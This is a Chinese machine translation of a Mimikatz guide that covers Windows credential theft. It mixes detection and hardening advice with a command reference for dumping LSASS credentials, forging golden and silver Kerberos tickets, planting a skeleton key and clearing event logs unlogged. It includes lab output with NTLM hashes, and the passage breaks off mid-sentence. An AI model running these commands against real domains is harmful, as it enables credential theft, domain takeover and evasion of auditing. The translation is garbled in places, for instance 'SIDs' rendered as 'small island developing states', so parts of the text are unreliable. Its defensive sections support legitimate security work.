Mimikatz概述：Mimikatz是从Windows系统收集凭据数据的最佳工具之一。事实上，我认为Mimikatz是Windows凭证的“瑞士军刀”（或多工具） - 这是一个可以做任何事情的工具。由于Mimikatz，Benjamin Delpy的作者是法语，大多数描述Mimikatz使用的资源都是法语，至少在他的博客上。该Mimikatz GitHub的库是英文的，包括命令使用的有用信息。 Mimikatz是一个Windows x32 / x64程序，由Benjamin Delpy（@gentilkiwi）于2007年编写，用于了解有关Windows凭据（以及作为概念证明）的更多信息。有两个可选组件提供附加功能，mimidrv（与Windows内核交互的驱动程序）和mimilib（AppLocker旁路，Auth软件包/ SSP，密码过滤器和WinDBG的sekurlsa）。Mimikatz需要管理员或SYSTEM并经常debug权限以执行某些操作并与LSASS进程交互（取决于所请求的操作）。Mimikatz.exe包含或至少应包含其中指出的所有功能。 Mimikatz功能可以通过编译和运行您自己的版本，运行Mimikatz可执行文件，利用MetaSploit脚本，官方Invoke-Mimikatz PowerShell版本或十几种Mimikatz PowerShell变体（我碰巧偏向PowerShell Empire，因为帝国很棒！）。 Mimikatz源代码和发布二进制文件可在GitHub上获得，并在Creative Commons下获得许可，具有以下细节：您可以自由地：共享 - 以任何媒体或格式复制和重新分发材料* 适应 - 重新混合，转换和构建材料**用于任何目的，甚至商业用途。只要您遵守许可条款，许可人就不能撤销这些自由。归因 - 您必须提供适当的信用，提供许可证的链接，并指出是否进行了更改。您可以以任何合理的方式这样做，但不得以任何方式表明许可人认可您或您的使用。没有其他限制 - 您可能不会使用法律条款或技术措施来合法地限制他人做许可证所允许的任何事情。 Mimikatz作者： Benjamin DELPY gentilkiwi，你可以在推特上联系他（@gentilkiwi）或者通过邮件联系他（benjamin [at] gentilkiwi.com） lsadump模块中的DCSync功能与Vincent LE TOUX共同编写，您通过邮件联系他（vincent.letoux [at] gmail.com）或访问他的网站（http://www.mysmartlogon.com） “官方”Mimikatz链接：Mimikatz GitHub位置（源代码） Mimikatz发布（包括二进制文件） Mimikatz GitHub Wiki（文档，其中一些在此处转载） GentilKiwi Blog（大部分是法语，使用Chrome / other进行翻译） Mimikatz＆Credentials：​ 用户登录后，会生成各种凭据并将其存储在内存中的本地安全机构子系统服务LSASS中。这是为了便于单点登录（SSO），确保每次请求资源访问时都不会提示用户。凭证数据可能包括Kerberos票证，NTLM密码哈希值，LM密码哈希值（如果密码&lt;15个字符，具体取决于Windows操作系统版本和补丁级别），甚至是明文密码（以支持WDigest和SSP身份验证等）。 ​ 虽然可以阻止Windows计算机在本地计算机SAM数据库（和AD数据库）中创建LM哈希，但这不会阻止系统在内存中生成LM哈希。默认情况下，除非明确启用，否则Windows Server 2008和Windows Vista不再为用户生成LM哈希值。从Windows 8.1和Windows Server 2012 R2开始，LM哈希和“明文”密码不再在内存中。此功能也在kb2871997中“反向移植”到早期版本的Windows（Windows 7/8 / 2008R2 / 2012），但为了防止将“明文”密码放入LSASS，以下注册表项需要设置为“0”（摘要已禁用）： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest “UseLogonCredential”(DWORD) 此注册表项值得在您的环境中进行监控，因为攻击者可能希望将其设置为1以启用摘要密码支持，这会强制将“明文”密码放在任何版本的Windows上的LSASS中，从Windows 7 / 2008R2到Windows 10 / 2012R2。Windows 8.1 / 2012 R2及更新版本没有“UseLogonCredential”DWORD值，因此必须创建它。在这些系统上存在此密钥可能表明存在问题。 请注意，攻击者很少需要直接在目标系统上运行代码，因此Mimikatz会不断更新，以便远程运行新功能。这包括远程系统对远程系统运行Mimikatz以转储凭据，使用PowerShell远程处理远程使用Invoke-Mimikatz，以及DCSync，这是在没有运行任何Mimikatz代码的情况下远程访问域中任何Active Directory帐户的密码数据的最新功能在DC（它使用Microsoft的域控制器官方复制API，一旦获得正确的权限）。 OS提供的可用凭据：Benjamin Delpy在OneDrive上发布了一个Excel图表（不再可用，但如下所示），显示内存中可用的凭证数据类型（LSASS），包括Windows 8.1和Windows 2012 R2，它们具有增强的保护机制，减少了数量和类型凭证保存在内存中。（点击图片来embiggen） PowerShell和Mimikatz：大多数Mimikatz功能都可以在PowerSploit（PowerShell Post-Exploitation Framework）中通过“ Invoke-Mimikatz”PowerShell脚本（由Joseph Bialek编写）获得，脚本“leverages Mimikatz 2.0和Invoke-ReflectivePEInjection反射性地将Mimikatz完全加载到内存中。这允许您在不将Mimikatz二进制文件写入磁盘的情况下执行诸如转储凭证之类的操作。“请注意，PowerSploit框架现在托管在”PowerShellMafia“GitHub存储库中。 Invoke-Mimikatz的“神奇”之处在于能够将Mimikatz DLL（嵌入在脚本中）反射加载到内存中。Invoke-Mimikatz代码可以从Internet（或Intranet服务器）下载，并且可以从内存中执行而无需接触任何磁盘。此外，如果使用适当的权限运行Invoke-Mimikatz并且目标计算机启用了PowerShell远程处理，它可以从其他系统提取凭据，以及远程执行标准Mimikatz命令，而不会在远程系统上删除文件。 当Mimikatz出现时，Invoke-Mimikatz不会更新，尽管它可以（手动）。可以用新的DLL编码元素（32位和64位版本）替换掉。Will Schroeder（@ HarmJ0y）有关于在Invoke-Mimikatz中更新Mimikatz DLL的信息（这不是一个非常复杂的过程）。该调用-Mimikatz的PowerShell的帝国版本通常保持最新。 使用mimikatz从LSASS转储凭证： Invoke-Mimikatz -DumpCreds 使用mimikatz导出所有私有证书（即使它们被标记为不可导出）：Invoke-Mimikatz - DumpCerts 提升权限以在远程计算机上拥有debug权限：Invoke-Mimikatz -Command“privilege::debug exit”-ComputerName“computer1” Invoke-Mimikatz“Command”参数使Invoke-Mimikatz能够运行自定义Mimikatz命令。 ​ 检测Mimikatz：有几种方法可以在网络上检测Mimikatz的使用，但没有一种方法可以保证。由于Mimikatz的源代码在GitHub上，任何使用Visual Studio的人都可以编译自己的版本。我用“kitikatz”替换了所有“mimikatz”的实例，建立了我自己的Mimikatz版本，名为“kitikatz”，而VirusTotal的检测率并不好（4/54）。我的Windows 10系统上的Windows Defender检测到它。然后我用相同的单词替换了“Benjamin Delpy”和“gentilkiwi”，只用3代替e和i代替。检出率仍然很差（4/54）。我的Windows 10系统上的Windows Defender没有检测到它。因此，您的里程数会因检测而异。虽然VirusTotal不是确定AV检测的最佳方法，获得一些基本数字是一种相对简单的方法。 Benjamin Delpy 在Mimkatz GitHub存储库上发布了Mimikatz的YARA规则。 使用最新的定义文件运行AntiVirus软件。据VirusTotal称，35/35的AV引擎检测到日期为11/11/2015（32位和64位）的mimikatz.exe。重命名文件不会更改扫描结果。请注意，本杰明已经注意到现实世界的结果不太成功。但是，AV通常会标记已知的坏文件。AntiVirus是基础安全的一部分 - “深度防御”的第一层。 Mimikatz（截至10月）激活附属的BusyLights。[在Mimikatz版本2.0 alpha 20151008（oe.eo）版本中实施] 利用安全软件识别与LSASS交互的进程。监控过程注入的安全软件也可以定期检测Mimikatz的使用情况。 HoneyTokens / HoneyHashes涉及在企业中的许多计算机上将特殊凭证存储在内存中。标记了这些凭据，因此当有人尝试使用它们时，会发出严重警报。这需要某种推送方法以及放置对攻击者有吸引力的凭据。从理论上讲，这可以检测证书被盗和在环境中的使用。 如果企业中的WDIGEST注册表项（HKEY_LOCAL_MACHINE \\ SYSTEM \\ CurrentControlSet \\ Control \\ SecurityProviders \\ WDigest）应设置为“0”，以防止“明文”密码存储在LSASS中，并且系统中存在切换到“1”，这可能表示凭证盗窃活动。此注册表项值得在您的环境中进行监控，因为攻击者可能希望将其设置为0以启用摘要密码支持，这会强制将“明文”密码放在任何版本的Windows上的LSASS中，从Windows 7 / 2008R2到Windows 10 / 2012R2（可能还有2016年）。 我在2015年初发布的此页面上介绍了伪造的Kerberos票证检测。这些方法可以检测金票，银票和信任票。我还有关于如何检测MS14-068 Kerberos漏洞利用的信息。 在支持它的企业中的所有Windows版本上启用LSA Protection。这可以防止Mimikatz“开箱即用”，并且需要使用Mimikatz驱动程序，该驱动程序在与LSASS交互时记录事件。 从Windows 10和Windows Server 2016开始有新的/更新的事件，可能会检测到Mimikatz的使用： 向LSASS.exe添加了默认进程SACL在Windows 10中，将一个默认进程SACL添加到LSASS.exe以记录尝试访问LSASS.exe的进程。SACL是L“S :( AU; SAFA; 0x0010 ;;; WD）”。您可以在高级审核策略配置\\对象访问\\审核内核对象下启用此功能。这有助于识别从进程内存中窃取凭据的攻击。 Mimikatz＆LSA保护：Windows Server 2012 R2和Windows 8.1包含一项名为LSA Protection的新功能，该功能涉及在Windows Server 2012 R2上启用LSASS作为受保护进程（Mimikatz可以绕过驱动程序，但这会在事件日志中产生一些噪音）： LSA（包括本地安全机构服务器服务（LSASS）进程）验证用户是否进行本地和远程登录，并实施本地安全策略。Windows 8.1操作系统为LSA提供额外保护，以防止未受保护的进程读取内存和代码注入。这为LSA存储和管理的凭据提供了额外的安全性。 启用LSA保护： 打开注册表编辑器（RegEdit.exe），然后导航到位于以下位置的注册表项：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa 并将注册表项的值设置为：“RunAsPPL”=dword:00000001。 创建新GPO并浏览到“计算机配置”，“首选项”，“Windows设置”。右键单击“注册表”，指向“新建”，然后单击“注册表项”。将出现“新建注册表属性”对话框。在Hive列表中，单击HKEY_LOCAL_MACHINE。在“密钥路径”列表中，浏览到SYSTEM\\CurrentControlSet\\Control\\Lsa.。在“值名称”框中，键入RunAsPPL。在“值类型”框中，单击“REG_DWORD”。在“数值数据”框中，键入00000001.单击“确定”。 LSA Protection可防止未受保护的进程与LSASS交互。Mimikatz仍然可以通过驱动程序（“！+”）绕过它。 检测Invoke-Mimikatz： 确保所有Windows系统都具有PowerShell v3或更高版本。较新版本的PowerShell具有更好的日志记录功能，尤其是PowerShell v5。 通过组策略启用PowerShell模块日志记录：计算机配置，策略，管理模板，Windows组件和Windows PowerShell，打开模块日志记录。输入“*”并单击“确定”。这将记录所有PowerShell活动，包括所有PowerShell模块。 PowerShell活动将记录到PowerShell操作日志中。将这些事件推送或拉到中央日志记录服务器（通过Windows事件转发或类似方法）或SIEM。 解析以下内容的PowerShell事件： “System.Reflection.AssemblyName” “System.Reflection.Emit.AssemblyBuilderAccess” “System.Runtime.InteropServices.MarshalAsAttribute” “TOKEN_PRIVILEGES” “SE_PRIVILEGE_ENABLED” 注意：虽然可以通过警告“mimikatz”，“Delpy”或“gentilkiwi”来识别Mimikatz的使用情况，但“复杂”的攻击者可能会在没有这些关键字的情况下推出他们自己的Mimikatz或Invoke-Mimikatz版本。 检测攻击性PowerShell工具：许多PowerShell攻击性工具使用以下在PowerShell模块日志记录中记录的调用。 “GetDelegateForFunctionPointer” “System.Reflection.AssemblyName” “System.Reflection.Emit.AssemblyBuilderAccess” “System.Management.Automation.WindowsErrorReporting” “MiniDumpWriteDump” “TOKEN_IMPERSONATE” “TOKEN_DUPLICATE” “TOKEN_ADJUST_PRIVILEGES” “TOKEN_PRIVILEGES” “Sneaky”的Mimikatz执行：凯西·史密斯（@subtee＆blog）已经做了很多工作，展示了应用程序白名单不是许多人认为的灵丹妙药。尽管如此，应用程序白名单是深度防御战略中的一个坚实层面。凯西还提出了许多创造性和偷偷摸摸的方式来执行Mimikatz。 在RegSvcs或RegAsm内部执行Mimikatz - .NET实用程序概念验证 Mimikatz打包并隐藏在图像文件中 从GitHub下载并执行Mimikatz In Memory 注意：Subtee已经停止使用他的GitHub仓库，因此这些链接不再有效并且已被删除。 最受欢迎的Mimikatz命令：以下是一些最受欢迎的Mimikatz命令和相关功能。 CRYPTO::Certificates - 列出/出口证书 KERBEROS::Golden - 制作金/银/信托票（ golden/silver/trust tickets） KERBEROS::List - 列出用户内存中的所有用户票证（TGT和TGS）。不需要特殊权限，因为它只显示当前用户的票证。类似于“klist”的功能。 KERBEROS::PTT - 通过门票。通常用于注入被盗或伪造的Kerberos票（金/银/信托）。 LSADUMP::DCSync - 要求DC同步对象（获取帐户的密码数据）。无需在DC上运行代码。 LSADUMP::LSA - 要求LSA Server检索SAM / AD企业（正常，动态补丁或注入）。用于从域控制器或lsass.dmp转储文件转储所有Active Directory域凭据。还用于获取特定的帐户凭据，例如krbtgt和参数/ name：“/ name：krbtgt” LSADUMP::SAM - 获取SysKey来解密SAM条目（来自注册表或配置单元）。SAM选项连接到本地安全帐户管理器（SAM）数据库并转储本地帐户的凭据。这用于转储Windows计算机上的所有本地凭据。 LSADUMP::Trust - 要求LSA Server检索Trust Auth信息（正常或动态补丁）。转储所有关联信任（域/林）的信任密钥（密码）。 MISC::AddSid - 将SIDHistory添加到用户帐户。第一个值是目标帐户，第二个值是帐户/组名称（或SID）。已移至SID：自2016年5月6日起修改。 MISC::MemSSP - 注入恶意Windows SSP以记录本地经过身份验证的凭据。 MISC::Skeleton - 在域控制器上将Skeleton Key注入LSASS进程。这使得对Skeleton Key修补DC的所有用户身份验证都可以使用“主密码”（也称为Skeleton Keys）以及通常的密码。 PRIVILEGE::Debug - 获取debug权限（许多Mimikatz命令需要此权限或本地系统权限）。 SEKURLSA::Ekeys - 列出Kerberos加密密钥 SEKURLSA::Kerberos - 列出所有经过身份验证的用户（包括服务和计算机帐户）的Kerberos凭据 SEKURLSA::Krbtgt - 获取Domain Kerberos服务帐户（KRBTGT）密码数据 SEKURLSA::LogonPasswords - 列出所有可用的提供者凭据。这通常显示最近登录的用户和计算机凭据。 SEKURLSA::Pth - Pass- theHash和Over-the-the-Hash SEKURLSA::Tickets - 列出所有最近通过身份验证的用户的所有可用Kerberos票证，包括在用户帐户和本地计算机的AD计算机帐户下运行的服务。与kerberos::list不同，sekurlsa使用内存读取，不受关键出口限制。sekurlsa可以访问其他会话（用户）的门票。 TOKEN::List - 列出系统的所有令牌 TOKEN::Elevate - 模拟令牌。用于将权限提升为SYSTEM（默认）或在框中查找域管理员令牌 TOKEN::Elevate / domainadmin - 使用域管理员凭据模拟令牌。 ADSecurity Mimikatz帖子：所有帖子提到Mimikatz：ADSecurity.org Mimikatz Posts Mimikatz和Active Directory Kerberos攻击 使用Mimikatz DCSync转储域中所有管理员的明文密码 攻击者如何使用Kerberos Silver Tickets来利用系统 Mimikatz DCSync使用，利用和检测 偷偷摸摸的Active Directory持久性＃12：恶意安全支持提供程序（SSP） 偷偷摸摸的Active Directory持久性＃11：目录服务还原模式（DSRM） Kerberos金票现在更加黄金 全是关于信任 - 在Active Directory信任中伪造Keroos信任票到欺骗访问 检测Mimikatz使用 Mimikatz指南：Mimikatz可以通过简单地运行“Mimikatz.exe”或传递命令并退出（例如：’ Mimikatz“kerberos::list”exit’）以交互模式执行。Invoke-Mimikatz没有交互模式。 Mimikatz可用于将命令从命令行传递到Mimikatz以按顺序处理，这对于Invoke-Mimikatz或在脚本中使用Mimikatz非常有用。执行完最后一个命令后，追加“退出”退出Mimikatz（这样做，所以Mimikatz优雅地退出）。 1PS C:\\temp\\mimikatz&gt;.\\mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit 123456.#####. mimikatz 2.0 alpha (x64) release &quot;Kiwi en C&quot; (Nov 13 2015 00:44:32) .## ^ ##. ## / \\ ## /* * * ## \\ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) &apos;## v ##&apos; http://blog.gentilkiwi.com/mimikatz (oe.eo) &apos;#####&apos; with 17 modules * * */ 12mimikatz(commandline) # privilege::debug Privilege &apos;20&apos; OK 1mimikatz(commandline) # sekurlsa::logonpasswords 1234567891011121314151617181920212223242526uthentication Id : 0 ; 646260 (00000000:0009dc74) Session : RemoteInteractive from 2 User Name : adsadministrator Domain : ADSECLAB Logon Server : ADSDC03 Logon Time : 11/27/2015 11:41:27 AM SID : S-1-5-21-1581655573-3923512380-696647894-500 msv : [00000003] Primary * Username : ADSAdministrator * Domain : ADSECLAB * NTLM : 5164b7a0fda365d56739954bbbc23835 * SHA1 : f8db297cb2ae403f8915675cebe79643d0d3b09f [00010000] CredentialKeys * NTLM : 5164b7a0fda365d56739954bbbc23835 * SHA1 : f8db297cb2ae403f8915675cebe79643d0d3b09f tspkg : wdigest : * Username : ADSAdministrator * Domain : ADSECLAB * Password : (null) kerberos : * Username : adsadministrator * Domain : LAB.ADSECURITY.ORG * Password : (null) ssp : KO 交互模式提供“Mimikatz控制台”，可以在其中实时输入和执行命令： 1PS C:\\temp\\mimikatz&gt; .\\mimikatz 123456.#####. mimikatz 2.0 alpha (x64) release &quot;Kiwi en C&quot; (Nov 13 2015 00:44:32) .## ^ ##. ## / \\ ## /* * * ## \\ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) &apos;## v ##&apos; http://blog.gentilkiwi.com/mimikatz (oe.eo) &apos;#####&apos; with 17 modules * * */ 12mimikatz # privilege::debug Privilege &apos;20&apos; OK 1mimikatz # sekurlsa::logonpasswords 123456789101112131415161718192021222324252627Authentication Id : 0 ; 646260 (00000000:0009dc74) Session : RemoteInteractive from 2 User Name : adsadministrator Domain : ADSECLAB Logon Server : ADSDC03 Logon Time : 11/27/2015 11:41:27 AM SID : S-1-5-21-1581655573-3923512380-696647894-500 msv : [00000003] Primary * Username : ADSAdministrator * Domain : ADSECLAB * NTLM : 5164b7a0fda365d56739954bbbc23835 * SHA1 : f8db297cb2ae403f8915675cebe79643d0d3b09f [00010000] CredentialKeys * NTLM : 5164b7a0fda365d56739954bbbc23835 * SHA1 : f8db297cb2ae403f8915675cebe79643d0d3b09f tspkg : wdigest : * Username : ADSAdministrator * Domain : ADSECLAB * Password : (null) kerberos : * Username : adsadministrator * Domain : LAB.ADSECURITY.ORG * Password : (null) ssp : KO credman : Mimikatz命令参考**：Mimikatz版本历史 Mimikatz模块： BUSYLIGHT CRYPTO CRYPTO ::证书 DPAPI 事件 IIS KERBEROS 金门票 银色门票 信托票 KERBEROS::PTT LSADUMP DCSync DCShadow LSADUMP::LSA LSADUMP::NetSync LSADUMP::SAM LSADUMP ::TRUST MISC MINESWEEPER Net PRIVILEGE PRIVILEGE ::debug PROCESS RPC SERVICE SEKURLSA SEKURLSA::Kerberos的 SEKURLSA::KRBTGT SEKURLSA::LogonPasswords SEKURLSA ::Pth SID STANDARD SYSENV TOKEN TOKEN ::Elevate TOKEN::Elevate / domainadmin TS VAULT 注意：任何标记为“experimental”的项目都只能在测试环境中使用。 BUSYLIGHTBUSYLIGHT Mimikatz模块提供连接BusyLights的附加信息和控制。 BUSYLIGHT::List BUSYLIGHT::Off BUSYLIGHT::Single BUSYLIGHT::Status BUSYLIGHT::Test CRYPTOCRYPTO Mimikatz模块提供了与Windows加密功能（CryptoAPI）接口的高级功能。典型用途是导出未标记为“可导出”的证书。 CRYPTO::CAPI - （实验性）Patch CryptoAPI层，便于导出 CRYPTO ::Certificates - 列出/出口证书 Carlos Perez（又名DarkOperator）有一篇关于使用Mimikatz导出证书的博文。此命令列出了其密钥的证书和属性。它也可以导出证书。通常需要“privilege::debug” /systemstore - 可选 - 必须使用的系统存储（默认值：CERT_SYSTEM_STORE_CURRENT_USER） /store - 可选 - 必须用于列出/导出证书的商店（默认值：My） - 带有crypto::stores的完整列表 /export - 可选 - 将所有证书导出到文件（DER中的公共部分，PFX文件中的私有部分 - 密码保护：mimikatz） 本杰明对CRYPTO的评论：证书： 有关列表，请参阅crypto::stores有效systemstore列表及其输出store。 不可导出的密钥（带KO - ERROR kuhl_m_crypto_exportCert ; Export / CreateFile (0x8009000b)）通常可以用crypto::capi和/或导出crypto::cng 尽管crypto::capi或crypto::cng补丁，您必须在文件系统上具有正确的ACL才能访问私钥（UAC … !） 一些智能卡加密提供商可以报告成功的私人出口（当然不是 CRYPTO::CertToHW - 尝试将软件CA导出到加密（虚拟）硬件 CRYPTO::CNG - （实验性）修补CNG服务，便于导出（补丁“KeyIso”服务） CRYPTO::Extract - [experimental]从CAPI RSA / AES提供程序中提取密钥 CRYPTO::Hash - 使用可选的用户名哈希密码 CRYPTO::Keys - 列出/导出密钥容器 CRYPTO::Providers - 列出加密提供商 CRYPTO::SC - 列出智能卡读卡器 CRYPTO::SCAuth - 从CA创建身份验证证书（类似智能卡） CRYPTO::Stores –列出加密商店 /systemstore - 可选 - 必须用于列出存储的系统存储（默认值：CERT_SYSTEM_STORE_CURRENT_USER） 存储选项：CERT_SYSTEM_STORE_CURRENT_USER或CURRENT_USERCERT_SYSTEM_STORE_CURRENT_USER_GROUP_POLICY或USER_GROUP_POLICYCERT_SYSTEM_STORE_LOCAL_MACHINE或LOCAL_MACHINECERT_SYSTEM_STORE_LOCAL_MACHINE_GROUP_POLICY或LOCAL_MACHINE_GROUP_POLICYCERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE或LOCAL_MACHINE_ENTERPRISECERT_SYSTEM_STORE_CURRENT_SERVICE或CURRENT_SERVICECERT_SYSTEM_STORE_USERS或使用者CERT_SYSTEM_STORE_SERVICES或服务 CRYPTO::System - 描述Windows系统证书（文件，TODO：注册表或配置单元）。 DPAPIDPAPI Mimikatz模块提供使用DPAPI提取Windows存储（和受保护）凭据数据的功能。 DPAPI是保护（加密）本地数据（通常是密码）的官方Windows方法。 从Microsoft®Windows®2000开始，操作系统开始提供数据保护应用程序编程接口（API）。此数据保护API（DPAPI）是一对函数调用，为用户和系统进程提供操作系统级数据保护服务。通过操作系统级，我们指的是由操作系统本身提供的服务，不需要任何其他库。通过数据保护，我们指的是通过使用加密来提供数据机密性的服务。由于数据保护是操作系统的一部分，因此每个应用程序现在都可以保护数据，而不需要除了对DPAPI进行必要的函数调用之外的任何特定加密代码。这些调用是两个简单的函数，具有修改DPAPI行为的各种选项。总体， DPAPI是一种基于密码的数据保护服务。它需要密码才能提供保护。当然，缺点是DPAPI提供的所有保护都依赖于提供的密码。DPAPI使用经过验证的加密例程，特别是强大的Triple-DES算法和强密钥来抵消这一点，我们将在后面详细介绍。由于DPAPI专注于为用户提供保护并需要密码来提供此保护，因此它在逻辑上使用用户的登录密码进行保护。 以前在攻击DPAPI方面做了一些工作： 扭转DPAPI和脱机Windows密码 DPAPI秘密。DPAPI中的安全性分析和数据恢复 Benjamin Delpy在OneDrive上有一个Excel电子表格，其中列出了可能存储凭据的Windows位置 - 在线查看电子表格。 DPAPI::Blob - 使用API或Masterkey取消保护DPAPI blob DPAPI:Cache DPAPI::CAPI - CAPI密钥测试 DPAPI::Chrome - Chrome测试 DPAPI::CNG - CNG关键测试 DPAPI::Cred - CRE测试 DPAPI::CredHist - 配置Credhist文件 DPAPI::MasterKey - 配置Masterkey文件，unprotect（取决于密钥） DPAPI::Protect - 使用DPAPI保护数据 DPAPI::Vault - VAULT测试 DPAPI::WIFI - WIFI测试（需要XML配置文件 - 参考Ben的电子表格） DPAPI::WWAN - WWAN测试（需要XML配置文件 - 参考Ben的电子表格） 事件EVENT**EVENT::Clear - 清除事件日志 EVENT ::: Drop - （*实验性*）Patch Events服务以避免新事件 注意：运行privilege::debug然后运行event::drop来修补事件日志。然后运行Event::Clear以清除事件日志，而不记录任何日志清除事件（1102）。 IISIIS XML配置模块 IIS::APPHOST KERBEROSKERBEROS Mimikatz模块用于与官方Microsoft Kerberos API连接。此模块中的命令不需要特殊权限。 KERBEROS::Ask - 要求TGS门票 KERBEROS::Clist - 列出MIT / Heimdall ccache的门票 KERBEROS::Golden - 创建黄金 / 白银 / 信任票据此命令的功能基于检索到的密码哈希类型。 类型 需求 范围 金色 KRBTGT哈希 域/林 银 服务哈希 服务 相信 信任哈希 域/林 - &gt;域/林 （基于帐户访问） Golden Ticket金票Golden Ticket是使用KRBTGT NTLM密码哈希加密和签名的TGT。 可以创建Golden Ticket（GT）以模拟域中任何用户（真实的或想象的）作为域中任何组的成员（提供几乎无限量的权限）到域中的任何和每个资源。由于Golden Ticket是身份验证票证（下面描述的TGT），因此其范围是整个域（以及利用SID历史记录的AD林），因为TGT用于获取用于访问资源的服务票证（TGS）。Golden Ticket（TGT）包含用户组成员资格信息（PAC），并使用域的Kerberos服务帐户（KRBTGT）进行签名和加密，该帐户只能由KRBTGT帐户打开和读取。 总而言之，一旦攻击者获得了对KRBTGT密码哈希的访问权限，他们就可以创建Golden Tickets（TGT），随时提供对AD中任何内容的访问。 Mimikatz金票命令参考： 创造黄金票的Mimikatz命令是“kerberos::golden” / domain - 完全限定的域名。在此示例中：“lab.adsecurity.org”。 / sid - 域的SID。在此示例中：“S-1-5-21-1473643419-774954089-2222329127”。 / sids - AD林中具有您希望故障单欺骗的权限的帐户/组的其他SID。通常，这将是根域“S-1-5-21-1473643419-774954089-5872329127-519”的Enterprise Admins组。Ť 他的参数将提供的小岛屿发展中国家的SID历史参数。 /user - 模拟用户名 /groups（可选） - 用户所属的组RID（第一个是主要组）。添加用户或计算机帐户RID以接收相同的访问权限。默认组：513,512,520,518,519，用于众所周知的管理员组（如下所列）。 /krbtgt - 域KDC服务帐户（KRBTGT）的NTLM密码哈希。用于加密和签署TGT。 /ticket（可选） - 提供保存Golden Ticket文件以供以后使用的路径和名称，或使用/ ptt立即将黄金票据注入内存以供使用。 /ptt - 作为/ ticket的替代 - 使用它立即将伪造的票证注入内存以供使用。 /id（可选） - 用户RID。Mimikatz默认值为500（默认管理员帐户RID）。 /startoffset（可选） - 票证可用时的起始偏移量（如果使用此选项，通常设置为-10或0）。Mimikatz默认值为0。 /endin（可选） - 票证生命周期。Mimikatz默认值为10年（约5,262,480分钟）。Active Directory默认Kerberos策略设置为10小时（600分钟）。 /renewmax（可选） - 续订时的最长票证有效期。Mimikatz默认值为10年（约5,262,480分钟）。Active Directory默认Kerberos策略设置为7天（10,080分钟）。 /sids（可选） - 设置为AD林中Enterprise Admins组的SID（[ADRootDomainSID] -519），以欺骗整个AD林中的企业管理员权限（AD林中每个域中的AD管理员）。 /aes128 - AES128密钥 /aes256 - AES256密钥 金票默认组： 域用户SID：S-1-5-21 -513 域管理员SID：S-1-5-21 -512 架构管理员SID：S-1-5-21 -518 企业管理员SID：S-1-5-21 -519（仅当在林根域中创建伪造票证时才有效，但为AD林管理员权限添加使用/ sids参数） 组策略创建者所有者SID：S-1-5-21 -520 kerberos::golden / admin：ADMIINACCOUNTNAME / domain：DOMAINFQDN / id：ACCOUNTRID / sid：DOMAINSID / krbtgt：KRBTGTPASSWORDHASH / ptt 命令示例：。\\ mimikatz“kerberos::golden / admin：DarthVader /domain:rd.lab.adsecurity.org / id：9999 / sid：S-1-5-21-135380161-102191138-581311202 / krbtgt：13026055d01f235d67634e109da03321 / startoffset：0 / endin：600 / renewmax：10080 / ptt“退出 金票参考： * 黄金门票现在更加黄金（有SID历史） 2016年1月初更新： 2015年1月初，我与客户分享了检测伪造Kerberos门票的指标，随后在2015年的BSides Charm上提供了此信息。不久之后，Mimikatz更新了一个设置为静态值的域字段，通常包含字符串“eo.oe”。截至2016年1月5日的Mimikatz更新，伪造的Kerberos票证不再包含域异常，因为netbios域名放置在Kerberos票证的域组件中。 Mimikatz代码差异： 上的困难的详细信息在所述检测伪造的Kerberos票证（金券，银门票等）在检测锻造Kerberos票证部。 Silver Ticket 银色票Silver Ticket是使用目标服务帐户（由SPN映射标识）NTLM密码哈希来加密和签名的TGS（类似于TGT格式）。 创造银票的Mimikatz命令是“kerberos::golden”（是的，你运行’golden’来创建银票）。 Mimikatz Silver Ticket Command参考： /domain - 完全限定的域名。在此示例中：“lab.adsecurity.org”。 /sid - 域的SID。在此示例中：“S-1-5-21-1473643419-774954089-2222329127”。 /sids - AD林中具有您希望故障单欺骗的权限的帐户/组的其他SID。通常，这将是根域“S-1-5-21-1473643419-774954089-5872329127-519”的Enterprise Admins组。Ť 他的参数将提供的小岛屿发展中国家的SID历史参数。 /user - 模拟用户名 / groups（可选） - 用户所属的组RID（第一个是主要组）默认值：513,512,520,518,519，用于众所周知的管理员组（如下所列）。 /ticket（可选） - 提供用于保存伪造的票证文件以供以后使用的路径和名称，或使用/ ptt立即将黄金票据注入内存以供使用。 / ptt - 作为/ ticket的替代 - 使用它立即将伪造的票证注入内存以供使用。 /id（可选） - 用户RID。Mimikatz默认值为500（默认管理员帐户RID）。 / startoffset（可选） - 票证可用时的起始偏移量（如果使用此选项，通常设置为-10或0）。Mimikatz默认值为0。 / endin（可选） - 票证生命周期。Mimikatz默认值为10年（约5,262,480分钟）。Active Directory默认Kerberos策略设置为10小时（600分钟）。 /renewmax（可选） - 续订时的最长票证有效期。Mimikatz默认值为10年（约5,262,480分钟）。Active Directory默认Kerberos策略设置为7天（10,080分钟）。 / aes128 - AES128密钥 / aes256 - AES256密钥 Silver Ticket必需参数： /target - 目标服务器的FQDN。 /service - 目标服务器上运行的kerberos服务。这是服务主体名称类（或类型），如cifs，http，mssql。 /rc4 - 服务的NTLM哈希值（计算机帐户或用户帐户） 银票默认组： 域用户SID：S-1-5-21 -513 域管理员SID：S-1-5-21 -512 架构管理员SID：S-1-5-21 -518 企业管理员SID：S-1-5-21 -519（仅当在林根域中创建伪造票证时才有效，但为AD林管理员权限添加使用/ sids参数） 组策略创建者所有者SID：S-1-5-21 -520 示例Mimikatz命令创建银票： 以下Mimikatz命令在服务器adsmswin2k8r2.lab.adsecurity.org上为CIFS服务创建Silver Ticket。为了成功创建此Silver Ticket，需要通过AD域转储或在本地系统上运行Mimikatz来发现adsmswin2k8r2.lab.adsecurity.org的AD计算机帐户密码哈希，如上所示（Mimikatz“ privilege::debug“”sekurlsa::logonpasswords“退出）。NTLM密码哈希与/ rc4参数一起使用。还需要在/ service参数中标识服务SPN类型。最后，需要在/ target参数中提供目标计算机的完全限定域名。不要忘记/ sid参数中的域SID。 mimikatz“kerberos::golden / admin：LukeSkywalker / id：1106 /domain:lab.adsecurity.org / sid：S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org / rc4 ：d7e2b80507ea074ad59f152a1ba20458 / service：cifs / ptt“退出 信托票确定Active 